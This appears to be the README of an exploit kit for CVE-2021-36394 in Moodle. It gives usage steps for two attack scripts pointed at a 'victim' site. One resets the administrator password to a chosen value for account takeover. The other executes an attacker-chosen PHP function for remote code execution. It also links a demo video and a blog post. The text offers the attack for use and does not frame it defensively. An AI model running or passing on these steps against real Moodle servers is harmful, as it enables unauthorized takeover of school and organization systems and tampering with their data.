# CVE-2021-36394


## Update table or Change password Admin: 

Custom Code
`
$newpassword = "Accounttakedover123";
`
Then Execute:


`
$ CVE2021-36394.php http://victim/path_to_moodle
`

## Execute function
Custom Code
`$function = "header";
$param = "Hacked: by0d0ff9";
`

Then Execute:

`
$ CVE2021-36394_RCE.php http://victim/path_to_moodle
`

### Demo: https://www.youtube.com/watch?v=rn4ENyASWe8
### Blog: https://0xd0ff9.wordpress.com/2021/08/28/cve-2021-36394-hack-truong-sua-diem-cac-kieu/
